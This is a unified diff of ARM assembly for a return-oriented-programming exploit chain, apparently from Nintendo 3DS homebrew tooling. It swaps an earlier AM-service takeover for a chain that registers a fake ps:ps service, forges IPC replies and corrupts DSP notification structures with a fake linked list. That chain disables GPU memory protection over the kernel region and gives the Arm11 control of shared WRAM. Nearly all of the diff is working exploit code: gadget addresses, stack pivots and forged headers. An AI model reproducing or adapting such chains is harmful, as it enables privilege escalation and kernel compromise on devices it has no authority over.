@@ -2,7 +2,6 @@
 	.section .rodata.NIM_ROP_Service, "a"
 	.p2align 4
 	#include "nim_rop.h"
-	#include "am_rop.h"
 	#define ROP_ABSTRACT_ADDR(x) (ROP_SERVICE_TAKEOVER_ADDR + ((x) - NIMS_0x5E_ROP_TakeOver))
 	.altmacro
 
@@ -49,9 +48,9 @@
 	1:
 	.endm
 
-	.macro svcReplyAndReceive_NIMS_Handle
+	.macro svcReplyAndReceive_Handles ReplyHandlePtr:req, HandlesPtr:req
 	.word ROP_POPR0PC @ pc
-	.word ROP_NIMS_SESSION_HANDLE_ADDR @ r0
+	.word \ReplyHandlePtr @ r0
 	.word ROP_LDR_R0FROMR0_POPR4PC @ pc
 	.word ROP_GARBAGE @ r4
 	.word ROP_POPR1PC @ pc
@@ -63,7 +62,7 @@
 	.word ROP_STACK_PIVOT @ pivot
 	@ pivot data for svcReplyAndReceive calling
 	1:
-	.word ROP_NIMS_SESSION_HANDLE_ADDR @ r1
+	.word \HandlesPtr @ r1
 	.word 1 @ r2
 	2:
 	.word 0xBEEFBEEF @ r3
@@ -118,82 +117,7 @@
 
 	.global NIMS_0x5E_ROP_TakeOver
 NIMS_0x5E_ROP_TakeOver:
-	@ This rop is for am:net instances specifically, with AM:GetRequiredSizeFromCia
-	@ Define AM_U_TARGET before am_rop.h include for am:u
-	@ original buffer is 0x400 bytes long
-	@ corrupt an extra 0x28 and we corrupt r4, r5, r6, r7 and lr regs saved in stack along with it
-	@ this rop also is meant to work at any address positioning of itself
-.Lam_rop_section_start:
-	.word 0 @ r4
-	.word 0 @ r5
-	.word AM_ROP_POPR2R3R4PC @ r6
-	.word 0 @ r7
-	.word AM_ROP_MOVR1SP_BLXR6 @ pc
-	.word .Lam_rop_section_end - . + 0x218 + 0x20 @ r2 - getting relative offset of obj ptr to clean
-	.word 0 @ r3
-	.word 0 @ r4
-	.word AM_ROP_LDRR1_R1R2_POPR4R5R6PC @ pc
-	.word 0 @ r4
-	.word 0 @ r5
-	.word 0 @ r6
-	.word AM_ROP_MOVR0R1_POPR1R2R3R4R5R6R7PC @ pc
-	.word 0 @ r1
-	.word 0 @ r2
-	.word 0 @ r3
-	.word 0 @ r4
-	.word 0 @ r5
-	.word 0 @ r6
-	.word 0 @ r7
-	.word AM_ROP_FILESTREAMDESCTRUCT_POPR4PC @ pc
-	.word AM_ROP_PXIAM9_HANDLE_ADDR @ r4
-	.word AM_ROP_MOVR0R4_POPR4PC @ pc
-	.word 0 @ r4
-	.word AM_ROP_POPR1R2R3PC @ pc
-	.word AM_ROP_POPR1R2R3PC @ r1
-	.word 0 @ r2
-	.word AM_ROP_GETTLSADDR_ADD0X5C_POPR4PC @ r3 - to set lr for ROP_LDRR2_R1_LDRR3_R0_SPOILR0_BXLR
-	.word AM_ROP_MOVLRR3_BXR1 @ pc
-	.word AM_ROP_PXIAM9_HANDLE_ADDR @ r1
-	.word 0 @ r2
-	.word 0 @ r3
-	.word AM_ROP_LDRR2_R1_LDRR3_R0_SPOILR0_BXLR @ pc
-	.word 0 @ r4
-	.word AM_ROP_POPR1PC @ pc
-	.word 0x24 + 0xC @ r1
-	.word AM_ROP_STRR3_R0R1_POPR4R5PC @ pc
-	.word 0 @ r4
-	.word 0 @ r5
-	.word AM_ROP_POPR1R2R3PC @ pc
-	.word 0x24 + 0x8 @ r1
-	.word 0 @ r2
-	.word IPC_Desc_SharedHandles(1) @ r3
-	.word AM_ROP_STRR3_R0R1_POPR4R5PC @ pc
-	.word 0 @ r4
-	.word 0 @ r5
-	.word AM_ROP_POPR1R2R3PC @ pc
-	.word 0x24 + 0x4 @ r1
-	.word 0 @ r2
-	.word 0x0 @ r3 - result 0
-	.word AM_ROP_STRR3_R0R1_POPR4R5PC @ pc
-	.word 0 @ r4
-	.word 0 @ r5
-	.word AM_ROP_POPR1R2R3PC @ pc
-	.word 0x24 + 0x0 @ r1
-	.word 0 @ r2
-	.word IPC_MakeHeader(0x40D, 1, 2) @ r3
-	.word AM_ROP_STRR3_R0R1_POPR4R5PC @ pc
-	.word .Lam_rop_section_end - 1f + 0x218 + 0x78 + 0x30 + AM_ROP_STACK_FIXUP @ r4 - enough to recover to a pop {r4-r7,pc}, where it will return and respond to us
-	.word 0 @ r5
-	.word AM_ROP_ADDSPR4_POPR4R5R6R7PC @ pc
-	1: // after this, we dont run more of the rop, but still need padding
-	.fill 0x414 - (. - .Lam_rop_section_start), 1, 0
-	.word .Lam_rop_section_start - .Lam_rop_section_end @ r4
-	.word 0 @ r5
-	.word 0 @ r6
-	.word 0 @ r7
-	.word AM_ROP_ADDSPR4_POPR4R5R6R7PC @ pc
-.Lam_rop_section_end:
-	.fill 4096 - (.Lam_rop_section_end - .Lam_rop_section_start), 1, 0
+	.fill 0x208
 	@ at this point, its our rop service
 	@ this is a linear service, expecting specific order of commands
 	@ first lets get tls cmd address and safe it to be easier
@@ -208,14 +132,8 @@ NIMS_0x5E_ROP_TakeOver:
 	.word ROP_POPR1PC @ pc
 	.word ROP_ABSTRACT_ADDR(.LTLS_CMD_Addr) @ r1
 	.word ROP_STR_R0TOR1_POPR4PC @ pc
-	@ restore original static buf
-	.word ROP_STATICBUF_DESCINDEX0 @ r4
-	.word ROP_POPR1R2R3PC @ POP {R1-R3, PC}
-	.word ROP_GARBAGE @ r1
-	.word 0x104 @ r2  0x184 - 0x80
-	.word ROP_GARBAGE @ r3
-	.word ROP_STR_R4TOR2R0_POPR4PC @ str r4, [r2,r0] and pop {r4,pc}
-	.word IPC_Desc_StaticBuffer(0x40, 0) @ r4
+	@ set a new static buf 0 size
+	.word IPC_Desc_StaticBuffer(0x208, 0) @ r4
 	.word ROP_POPR1R2R3PC @ POP {R1-R3, PC}
 	.word ROP_GARBAGE @ r1
 	.word 0x100 @ r2  0x180 - 0x80
@@ -229,133 +147,206 @@ NIMS_0x5E_ROP_TakeOver:
 	.word ROP_GARBAGE @ r3
 	.word ROP_MEMCPY_POPR0PC @ bl memcpy, pop {r0, pc}
 	.word ROP_GARBAGE @ r0
-	svcReplyAndReceive_NIMS_Handle
-	@ expecting cmd 0x804
+	svcReplyAndReceive_Handles ROP_NIMS_SESSION_HANDLE_ADDR, ROP_NIMS_SESSION_HANDLE_ADDR
+	@ excepting custom cmd 0x1001
 	Copy_From_TlsCMDBuf ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace), 0x100
-	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace), ROP_ABSTRACT_ADDR(.LFSFile_GetSizeHeader), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
-	Copy_To_TlsCMDBuf ROP_ABSTRACT_ADDR(.LFSFile_GetSize_Response), (.LFSFile_GetSize_Response_end - .LFSFile_GetSize_Response)
-	svcReplyAndReceive_NIMS_Handle
-	@ expecting cmd 0x802 and size requested 32 bytes for Cia header read
-	Copy_From_TlsCMDBuf ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace), 0x100
-	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace), ROP_ABSTRACT_ADDR(.LFSFile_ReadHeader), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
-	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace + 4*4), ROP_ABSTRACT_ADDR(.LFSFile_CiaHeaderDescBuf), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
+	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace), ROP_ABSTRACT_ADDR(.LCustom0x1001), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
 	.word ROP_POPR0PC @ pc
-	.word ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace + 4*5) @ r0
-	.word ROP_LDR_R0FROMR0_POPR4PC @ pc
+	.word ROP_ABSTRACT_ADDR(.LSVC0x4F_handles+0) @ r0
+	.word ROP_POPR1R2R3PC @ pc
+	.word ROP_ABSTRACT_ADDR(.LPSPS_Name) @ r1
+	.word 5 @ r2
+	.word 1 @ r3
+	.word ROP_SRVREGISTERSERVICE_NOPUSH @ pc
+	@ normally this function pushes {r1-r7} so we set that as well
+	.word ROP_ABSTRACT_ADDR(.LPSPS_Name) @ r1
+	.word 5 @ r2
+	.word 1 @ r3
 	.word ROP_GARBAGE @ r4
+	.word ROP_GARBAGE @ r5
+	.word ROP_GARBAGE @ r6
+	.word ROP_GARBAGE @ r7
 	.word ROP_POPR1PC @ pc
-	.word ROP_ABSTRACT_ADDR(.LFSFile_Read_CIAHeader_Response + 4*4) @ r1
-	.word ROP_STR_R0TOR1_POPR4PC
-	.word ROP_GARBAGE @ pc
-	.word ROP_POPR1R2R3PC @ pc
-	.word ROP_ABSTRACT_ADDR(.LDummyCiaHeader) @ r1
-	.word 32 @ r2
-	.word ROP_GARBAGE @ r3
-	.word ROP_MEMCPY_POPR0PC @ pc
-	.word ROP_GARBAGE @ r0
-	Copy_To_TlsCMDBuf ROP_ABSTRACT_ADDR(.LFSFile_Read_CIAHeader_Response), (.LFSFile_Read_CIAHeader_Response_end - .LFSFile_Read_CIAHeader_Response)
-	@ we reply and wait now for 0x400 buffer read and ipctakeover AM
-	svcReplyAndReceive_NIMS_Handle
-	Copy_From_TlsCMDBuf ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace), 0x100
-	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace), ROP_ABSTRACT_ADDR(.LFSFile_ReadHeader), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
-	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace + 4*4), ROP_ABSTRACT_ADDR(.LFSFile_PwnTargetDescBuf), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
-	@ using ipc given buffer addr and determine the page count of 1 or 2 (should not be more)
-	@ pointer to ipc buf is not aligned to page alignment (0x1000)
-	@ and its no more than two given that the original size requested was 0x400
-	@ pointed memory for desc_buffer on ipc response gets unmapped at the response
-	@ but if i point to an arbitrary address, this gets unmapped and the ipc given memory is not
-	@ so instead i'll reuse the memory given to me in a way i know it's safe for me to do so
-	@ this way i make this rop even cleaner, not leaving any memory mappings behind
-	.word ROP_POPR0PC @ pc
-	.word ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace + 4*5) @ r0
-	.word ROP_LDR_R0FROMR0_POPR4PC @ pc
-	.word 0x400 @ r4
-	.word ROP_POPR1R2R3PC @ pc
-.LTmp1:
-	.word ROP_GARBAGE @ r1
-	.word ROP_GARBAGE @ r2
-	.word ROP_ABSTRACT_ADDR(.LTmp1) @ r3
-	.word ROP_ADDR0_R4_STR_R0TOR3_POPR4PC @ pc
-	.word ROP_GARBAGE @ r4
-	.word ROP_POPR1R2R3PC @ pc
-	.word 12 @ r1
-	.word 32 - 12 @ r2
-	.word ROP_GARBAGE @ r3
-	.word ROP_GET_R0_BIT_CHUNK_POPR4PC @ pc
-	.word ROP_GARBAGE @ r4
-	.word ROP_POPR1PC @ pc
-	.word ROP_ABSTRACT_ADDR(.LTmp1) @ r1
+	.word ROP_ABSTRACT_ADDR(.LTmpCmpVar) @ r1
 	.word ROP_STR_R0TOR1_POPR4PC @ pc
 	.word ROP_GARBAGE @ r4
+	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LTmpCmpVar), ROP_ABSTRACT_ADDR(.LComparable_zero), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
+	@ got event to create
 	.word ROP_POPR0PC @ pc
-	.word ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace + 4*5) @ r0
-	.word ROP_LDR_R0FROMR0_POPR4PC @ pc
-	.word ROP_GARBAGE @ r4
-	.word ROP_POPR1R2R3PC @ pc
-	.word 12 @ r1
-	.word 32 - 12 @ r2
-	.word ROP_GARBAGE @ r3
-	.word ROP_GET_R0_BIT_CHUNK_POPR4PC @ pc
-	.word ROP_GARBAGE @ r4
-	.word ROP_POPR1PC @ pc
-	.word ROP_ABSTRACT_ADDR(.LTmp2) @ r1
-	.word ROP_STR_R0TOR1_POPR4PC @ pc
-	.word ROP_GARBAGE @ r4
-	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LTmp1), ROP_ABSTRACT_ADDR(.LTmp2), ROP_ABSTRACT_ADDR(.LMultiPageDescBuf)
-	@ single page ipc buf
-	@ use ipc_desc_buf_addr & 0xFFFFF000
-	.word ROP_POPR0PC @ pc
-.LTmp2:
-	.word 0xBEEFBEEF @ r0
-	.word ROP_POPR1R2R3PC @ pc
-	.word 0 @ r1
-	.word 0x1000 @ r2
-	.word 0 @ r3
-	.word ROP_LMUL_POPPC @ pc
-	.word ROP_POPR1PC @ pc
-	.word ROP_ABSTRACT_ADDR(.LFSFile_Read_PWD_Response + 4*4) @ r1
-	.word ROP_STR_R0TOR1_POPR4PC @ pc
-	.word ROP_GARBAGE @ r4
-	.word ROP_POPR1R2R3PC @ pc
-	.word ROP_ABSTRACT_ADDR(.Lam_rop_section_start) @ r1
-	.word (.Lam_rop_section_end - .Lam_rop_section_start) @ r2
-	.word ROP_GARBAGE @ r3
-	.word ROP_MEMCPY_POPR0PC @ pc
-	.word ROP_STACK_PIVOTBUF_ADDR(ROP_ABSTRACT_ADDR(1f)) @ r0
+	.word ROP_STACK_PIVOTBUF_ADDR(ROP_ABSTRACT_ADDR(1f)) @ r0 - pivot addr
 	.word ROP_STACK_PIVOT @ pc
 	1:
-	.word 0 @ r1
+	.word 1 @ r1 - RESET_STICKY
 	.word 0 @ r2
 	.word 0 @ r3
 	.word 0 @ r12
-	.word ROP_ABSTRACT_ADDR(2f) @ sp
-	.word 0 @ lr
-	.word ROP_POPPC @ pc
-	@ multi page ipc buf
-	@ use ipc_desc_buf_addr as is
-	@ we write more than the original 0x400 bytes but no more than 0x1000 so its fine
-.LMultiPageDescBuf:
+	.word ROP_ABSTRACT_ADDR(1f) @ sp - right after pivot
+	.word ROP_POPR1PC @ lr
+	.word ROP_SVCCREATEEVENT_SKIPPUSH @ pc
+	1:
+	.word ROP_ABSTRACT_ADDR(.LSVC0x4F_handles+8) @ [SP] target new event
+	.word ROP_ABSTRACT_ADDR(.LTmpCmpVar) @ r1
+	.word ROP_STR_R0TOR1_POPR4PC @ pc
+	.word ROP_GARBAGE @ r4
+	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LTmpCmpVar), ROP_ABSTRACT_ADDR(.LComparable_zero), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
+	@ signal event
 	.word ROP_POPR0PC @ pc
-	.word ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace + 4*5) @ r0
+	.word ROP_STACK_PIVOTBUF_ADDR(ROP_ABSTRACT_ADDR(1f)) @ r0 - pivot addr
+	.word ROP_STACK_PIVOT @ pc
+	1:
+	.word ROP_GARBAGE @ r1
+	.word ROP_GARBAGE @ r2
+	.word ROP_GARBAGE @ r3
+	.word ROP_GARBAGE @ r12
+	.word ROP_ABSTRACT_ADDR(1f) @ sp - right after pivot
+	.word ROP_POPR1PC @ lr
+	.word ROP_POPR0PC @ pc
+	1:
+	.word ROP_ABSTRACT_ADDR(.LSVC0x4F_handles+8) @ r0
+	.word ROP_LDR_R0FROMR0_POPR4PC @ pc
+	.word ROP_GARBAGE @ r4
+	.word ROP_SVCSIGNALEVENT @ pc - lr used here
+	.word ROP_ABSTRACT_ADDR(.LTmpCmpVar) @ r1
+	.word ROP_STR_R0TOR1_POPR4PC @ pc
+	.word ROP_GARBAGE @ r4
+	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LTmpCmpVar), ROP_ABSTRACT_ADDR(.LComparable_zero), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
+	Copy_To_TlsCMDBuf ROP_ABSTRACT_ADDR(.LCustom0x1001_Response), (.LCustom0x1001_Response_end - .LCustom0x1001_Response)
+	svcReplyAndReceive_Handles ROP_NIMS_SESSION_HANDLE_ADDR, ROP_ABSTRACT_ADDR(.LSVC0x4F_handles+0)
+	@ got request to accept
+	.word ROP_POPR0PC @ pc
+	.word ROP_ABSTRACT_ADDR(.LSVC0x4F_handles+0) @ r0
 	.word ROP_LDR_R0FROMR0_POPR4PC @ pc
 	.word ROP_GARBAGE @ r4
 	.word ROP_POPR1PC @ pc
-	.word ROP_ABSTRACT_ADDR(.LFSFile_Read_PWD_Response + 4*4) @ r1
+	.word ROP_ABSTRACT_ADDR(1f) @ r1
 	.word ROP_STR_R0TOR1_POPR4PC @ pc
 	.word ROP_GARBAGE @ r4
-	.word ROP_POPR1R2R3PC @ pc
-	.word ROP_ABSTRACT_ADDR(.Lam_rop_section_start) @ r1
-	.word (.Lam_rop_section_end - .Lam_rop_section_start) @ r2
-	.word ROP_GARBAGE @ r3
-	.word ROP_MEMCPY_POPR0PC @ pc
-	.word ROP_GARBAGE @ r0
-	2:
-	Copy_To_TlsCMDBuf ROP_ABSTRACT_ADDR(.LFSFile_Read_PWD_Response), (.LFSFile_Read_PWD_Response_end - .LFSFile_Read_PWD_Response)
-	@ we get a close command, good
-	svcReplyAndReceive_NIMS_Handle
+	.word ROP_POPR0PC @ pc
+	.word ROP_STACK_PIVOTBUF_ADDR(ROP_ABSTRACT_ADDR(1f)) @ r0 - pivot addr
+	.word ROP_STACK_PIVOT @ pc
+	1:
+	.word ROP_GARBAGE @ r1 - handle
+	.word 0 @ r2
+	.word 0 @ r3
+	.word 0 @ r12
+	.word ROP_ABSTRACT_ADDR(1f) @ sp - right after pivot
+	.word ROP_POPR1PC @ lr
+	.word ROP_SVCACCEPTSESSION_SKIPPUSH @ pc
+	1:
+	.word ROP_ABSTRACT_ADDR(.LSVC0x4F_handles+4) @ [SP] target new session
+	.word ROP_ABSTRACT_ADDR(.LTmpCmpVar) @ r1
+	.word ROP_STR_R0TOR1_POPR4PC @ pc
+	.word ROP_GARBAGE @ r4
+	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LTmpCmpVar), ROP_ABSTRACT_ADDR(.LComparable_zero), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
+	svcReplyAndReceive_Handles .LZero, ROP_ABSTRACT_ADDR(.LSVC0x4F_handles+4)
+	@ expecting cmd 0x2
 	Copy_From_TlsCMDBuf ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace), 0x100
-	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace), ROP_ABSTRACT_ADDR(.LFSFile_CloseHeader), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
-	Copy_To_TlsCMDBuf ROP_ABSTRACT_ADDR(.LFSFile_Close_Response), (.LFSFile_Close_Response_end - .LFSFile_Close_Response)
+	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace), ROP_ABSTRACT_ADDR(.PS_VerifyRsaSha256Header), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
+	.word ROP_POPR0PC @ pc
+	.word ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace + 4*13) @ r0
+	.word ROP_LDR_R0FROMR0_POPR4PC @ pc
+	.word ROP_GARBAGE @ r4
+	.word ROP_POPR1R2R3PC @ pc
+	.word 0 @ r1
+	.word 12 @ r2
+	.word ROP_GARBAGE @ r3
+	.word ROP_GET_R0_BIT_CHUNK_POPR4PC @ pc
+	.word ROP_GARBAGE @ r4
+	.word ROP_POPR1PC @ pc
+	.word ROP_ABSTRACT_ADDR(.LTmpCmpVar) @ r1
+	.word ROP_STR_R0TOR1_POPR4PC @ pc
+	.word ROP_GARBAGE @ r4
+	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LTmpCmpVar), ROP_ABSTRACT_ADDR(.LComparable_zero), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
+	.word ROP_POPR1R2R3PC @ pc
+	.word ROP_ABSTRACT_ADDR(.Ldsp_rop_notif_start) @ r1 - to str vtable later
+	.word ROP_GARBAGE @ r2
+	.word ROP_ABSTRACT_ADDR(1f) @ r3 - to update memcpy's r0 rop
+	.word ROP_POPR0PC @ pc
+	.word ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace + 4*13) @ r0
+	.word ROP_LDR_R0FROMR0_POPR4PC @ pc
+	.word 0xEA0 - 0xAB8 @ r4
+	.word ROP_ADDR0_R4_STR_R0TOR3_POPR4PC @ pc
+	.word ROP_GARBAGE @ r4
+	.word ROP_LDR_R0FROMR0_POPR4PC @ pc - loading vtable ptr
+	.word ROP_GARBAGE @ r4
+	.word ROP_STR_R0TOR1_POPR4PC @ pc
+	.word ROP_GARBAGE @ r4
+	.word ROP_POPR1PC @ pc
+	.word ROP_ABSTRACT_ADDR(.Ldsp_rop_notif_start + 4*4) @ r1
+	.word ROP_STR_R0TOR1_POPR4PC @ pc
+	.word ROP_GARBAGE @ r4
+	.word ROP_POPR0PC @ pc
+	1:
+	.word 0xBEEFBEEF @ r0
+	.word ROP_POPR1R2R3PC @ pc
+	.word ROP_ABSTRACT_ADDR(.Ldsp_notif_manager_start) @ r1
+	.word .Ldsp_notif_manager_end - .Ldsp_notif_manager_start @ r2
+	.word ROP_GARBAGE @ r3
+	.word ROP_MEMCPY_POPR0PC @ bl memcpy, pop {r0, pc}
+	.word ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace + 4*13) @ r0
+	.word ROP_LDR_R0FROMR0_POPR4PC @ pc
+	.word ROP_GARBAGE @ r4
+	.word ROP_POPR1R2R3PC @ pc
+	.word ROP_ABSTRACT_ADDR(.Ldsp_rop_notif_start) @ r1
+	.word .Ldsp_rop_notif_end - .Ldsp_rop_notif_start @ r2
+	.word ROP_GARBAGE @ r3
+	.word ROP_MEMCPY_POPR0PC @ bl memcpy, pop {r0, pc}
+	.word ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace + 4*13) @ r0
+	.word ROP_LDR_R0FROMR0_POPR4PC @ pc
+	.word ROP_GARBAGE @ r4
+	.word ROP_POPR1PC @ pc
+	.word ROP_ABSTRACT_ADDR(.PS_VerifyRsaSha256Header_Response + 4*3) @ r1
+	.word ROP_STR_R0TOR1_POPR4PC @ pc
+	.word ROP_GARBAGE @ r4
+	Copy_To_TlsCMDBuf ROP_ABSTRACT_ADDR(.PS_VerifyRsaSha256Header_Response), (.PS_VerifyRsaSha256Header_Response_end - .PS_VerifyRsaSha256Header_Response)
+	svcReplyAndReceive_Handles ROP_ABSTRACT_ADDR(.LSVC0x4F_handles+4), ROP_ABSTRACT_ADDR(.LSVC0x4F_handles+8)
+	@ cleaning!
+	.word ROP_POPR0PC @ pc
+	.word ROP_ABSTRACT_ADDR(.LPSPS_Name) @ r0
+	.word ROP_POPR1PC @ pc
+	.word 5 @ r1
+	.word ROP_SRVUNREGISTERSERVICE_NOPUSH @ pc
+	.word ROP_GARBAGE @ r2
+	.word ROP_GARBAGE @ r3
+	.word ROP_GARBAGE @ r4
+	.word ROP_GARBAGE @ r5
+	.word ROP_GARBAGE @ r6
+	.word ROP_POPR1R2R3PC @ pc
+	.word ROP_GARBAGE @ r1
+	.word ROP_GARBAGE @ r2
+	.word ROP_ABSTRACT_ADDR(.LTmpCmpVar) @ r3
+	.word ROP_STR_R0TOR3_POPR4PC @ pc
+	.word ROP_GARBAGE @ r4
+	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LTmpCmpVar), ROP_ABSTRACT_ADDR(.LComparable_zero), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
+	.word ROP_POPR0PC @ pc
+	.word ROP_ABSTRACT_ADDR(.LSVC0x4F_handles+0) @ r0
+	.word ROP_OBJHANDLE_CLOSE_POPR4PC @ pc
+	.word ROP_GARBAGE @ r4
+	.word ROP_POPR0PC @ pc
+	.word ROP_ABSTRACT_ADDR(.LSVC0x4F_handles+4) @ r0
+	.word ROP_OBJHANDLE_CLOSE_POPR4PC @ pc
+	.word ROP_GARBAGE @ r4
+	.word ROP_POPR0PC @ pc
+	.word ROP_ABSTRACT_ADDR(.LSVC0x4F_handles+8) @ r0
+	.word ROP_OBJHANDLE_CLOSE_POPR4PC @ pc
+	.word ROP_GARBAGE @ r4
+	@ restore original static buf
+	.word ROP_POPR0PC @ pc
+	.word ROP_ABSTRACT_ADDR(.LTLS_CMD_Addr) @ r0
+	.word ROP_LDR_R0FROMR0_POPR4PC @ pc
+	.word ROP_STATICBUF_DESCINDEX0 @ r4
+	.word ROP_POPR1R2R3PC @ POP {R1-R3, PC}
+	.word ROP_GARBAGE @ r1
+	.word 0x104 @ r2  0x184 - 0x80
+	.word ROP_GARBAGE @ r3
+	.word ROP_STR_R4TOR2R0_POPR4PC @ str r4, [r2,r0] and pop {r4,pc}
+	.word IPC_Desc_StaticBuffer(0x40, 0) @ r4
+	.word ROP_POPR1R2R3PC @ POP {R1-R3, PC}
+	.word ROP_GARBAGE @ r1
+	.word 0x100 @ r2  0x180 - 0x80
+	.word ROP_GARBAGE @ r3
+	.word ROP_STR_R4TOR2R0_POPR4PC @ str r4, [r2,r0] and pop {r4,pc}
+	.word ROP_GARBAGE @ r4
 	@ now we load the recovery payload
 	.word ROP_POPR0PC @ pc
 	.word ROP_STATICBUF_DESCINDEX2 @ r0
@@ -385,59 +376,93 @@ NIMS_0x5E_ROP_TakeOver:
 .LSVC0x4F_resulttmp:
 	.word 0
 
+.LSVC0x4F_handles:
+	.word 0 @ fake ps:ps service server
+	.word 0 @ ps:ps session
+	.word 0 @ bailout event
+
+.LPSPS_Name:
+	.byte 'p', 's', ':', 'p', 's', 0, 0, 0
+
+.LTmpCmpVar:
+	.word 0
+
+.LdspFwBssAddrPageOffset:
+	.word 0xAB8 @ 0x10CAB8 & 0xFFF
+
 .LComparable_zero:
+.LZero:
 	.word 0
 
-.LFSFile_GetSizeHeader:
-	.word IPC_MakeHeader(0x804, 0, 0)
-.LFSFile_ReadHeader:
-	.word IPC_MakeHeader(0x802, 3, 2)
-.LFSFile_CloseHeader:
-	.word IPC_MakeHeader(0x808, 0, 0)
+#define REL_FIXED_ADDR_ROPNOTIF(x) (0x10CAB8 + ((x) - .Ldsp_rop_notif_start))
 
-.LFSFile_CiaHeaderDescBuf:
-	.word IPC_Desc_Buffer(32, IPC_BUFFER_W)
+.Ldsp_notif_manager_start:
+	.word REL_FIXED_ADDR_ROPNOTIF(1f) @ firstNode
+	.word 1 @ lock.lock
+	.word 0 @ lock.thread_tag
+	.word 0 @ lock.counter
+.Ldsp_notif_manager_end:
 
-.LFSFile_PwnTargetDescBuf:
-	.word IPC_Desc_Buffer(0x400, IPC_BUFFER_W)
+.Ldsp_rop_notif_start:
+	@ notifications
+	@ [0]
+	.word 0 @ vtable
+	1:
+	.word (REL_FIXED_ADDR_ROPNOTIF(3f) - 0x0FFFFF70) + 4 @ node.prev
+	.word REL_FIXED_ADDR_ROPNOTIF(2f) @ node.next
+	.word 0x101B38 @ notificationId
+	@ [1]
+	.word 0 @ vtable
+	2:
+	.word REL_FIXED_ADDR_ROPNOTIF(1b) @ node.prev
+	.word 0 @ node.next
+	.word 0x100 @ notificationId
 
-.LFSFile_GetSize_Response:
-	.word IPC_MakeHeader(0x804, 3, 0)
+	@ rop
+	3:
+	.word 0x001015D0 @ pc (reload regs)
+
+	.word 0x1EC40140 @ r4, CFG11_GPUPROT (user virtual address)
+	.word 0x00000000 @ r5, 0, unprotect everything including AXIWRAM (where kernel is located)
+	.word 0x12345678 @ r6, don't care
+	.word 0x001015CC @ pc (write & reload regs)
+
+	@ Just to make sure Arm11 arbitrates the bus where we want to write our code
+	.word 0x1EC40000 @ r4, CFG11_SHAREDWRAM_32K_DATA<0..4>
+	.word 0x8D898581 @ r5, enable 32K chunk & set the Arm11 as bus master
+	.word 0x12345678 @ r6, don't care
+	.word 0x001015CC @ pc (write & reload regs)
+
+	.word 0x1EC40008 @ r4, CFG11_SHAREDWRAM_32K_CODE<0..4>
+	.word 0x8D898581 @ r5, enable 32K chunk & set the Arm11 as bus master
+	.word 0x12345678 @ r6, don't care
+	.word 0x001015CC @ pc (write & reload regs)
+
+	.word 0x12345678 @ r4, don't care
+	.word 0x12345678 @ r5, don't care
+	.word 0x12345678 @ r6, don't care
+	.word 0x00101094 @ pc, reset & disable dsp
+
+	.word 0x12345678 @ r4, don't care
+	.word 0x001048C4 @ pc, svcExitProcess	
+.Ldsp_rop_notif_end:
+
+.LCustom0x1001:
+	.word IPC_MakeHeader(0x1001, 0, 0)
+.PS_VerifyRsaSha256Header:
+	.word IPC_MakeHeader(0x2, 9, 4)
+
+.LCustom0x1001_Response:
+	.word IPC_MakeHeader(0x1001, 1, 0)
 	.word 0
-	.word 0x100
-	.word 0
-.LFSFile_GetSize_Response_end:
+.LCustom0x1001_Response_end:
 
-.LFSFile_Read_CIAHeader_Response:
-	.word IPC_MakeHeader(0x802, 2, 2)
-	.word 0
-	.word 32
-	.word IPC_Desc_Buffer(32, IPC_BUFFER_W)
+.PS_VerifyRsaSha256Header_Response:
+	.word IPC_MakeHeader(0x2, 1, 2)
+	.word 0xD15EA5E5 @ bail!
+	.word IPC_Desc_Buffer(0x1000 - 0xAB8, IPC_BUFFER_W)
 	.word 0xBEEFBEEF
-.LFSFile_Read_CIAHeader_Response_end:
-
-.LFSFile_Read_PWD_Response:
-	.word IPC_MakeHeader(0x802, 2, 2)
-	.word 0xE0C046F8
-	.word (.Lam_rop_section_end - .Lam_rop_section_start)
